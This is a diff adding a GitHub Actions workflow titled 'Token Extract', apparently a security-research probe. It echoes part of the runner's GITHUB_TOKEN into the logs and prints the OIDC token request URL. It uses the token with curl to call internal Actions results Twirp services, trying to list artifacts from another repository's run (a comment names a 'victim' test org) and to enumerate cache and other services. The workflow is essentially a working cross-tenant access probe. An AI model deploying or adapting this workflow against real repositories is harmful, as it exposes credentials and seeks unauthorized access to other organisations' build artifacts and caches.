@@ -1,0 +1,49 @@
+name: Token Extract
+on: workflow_dispatch
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Extract runtime token
+        run: |
+          echo "=== GITHUB_TOKEN first 20 chars ==="
+          echo "${GITHUB_TOKEN:0:20}..."
+          
+          echo ""
+          echo "=== Test Results API with GITHUB_TOKEN ==="
+          # Try to list artifacts from another repo's run
+          # victim-test-org-bb/actions-bypass-test run
+          curl -s -w "\nHTTP %{http_code}" -X POST \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            -H "Content-Type: application/json" \
+            "https://results.actions.githubusercontent.com/twirp/github.actions.results.api.v1.ArtifactService/ListArtifacts" \
+            -d '{"workflow_run_backend_id": "some-other-run-id", "workflow_job_run_backend_id": "test"}' 2>&1 | head -c 500
+          
+          echo ""
+          echo ""
+          echo "=== Try cache API ==="
+          curl -s -w "\nHTTP %{http_code}" -X POST \
+            -H "Authorization: Bearer $GITHUB_TOKEN" \
+            -H "Content-Type: application/json" \
+            "https://results.actions.githubusercontent.com/twirp/github.actions.results.api.v1.CacheService/ListCacheEntries" \
+            -d '{"key": "test", "version": "test"}' 2>&1 | head -c 500
+          
+          echo ""
+          echo ""
+          echo "=== Actions ID Token URL ==="
+          echo "OIDC URL: $ACTIONS_ID_TOKEN_REQUEST_URL"
+          echo ""
+          echo "=== Twirp service discovery ==="
+          # Check what services are available
+          for svc in ArtifactService CacheService StepSummaryService ActionsCacheService; do
+            CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST \
+              -H "Authorization: Bearer $GITHUB_TOKEN" \
+              -H "Content-Type: application/json" \
+              "https://results.actions.githubusercontent.com/twirp/github.actions.results.api.v1.$svc/List" \
+              -d '{}')
+            echo "$svc -> $CODE"
+          done
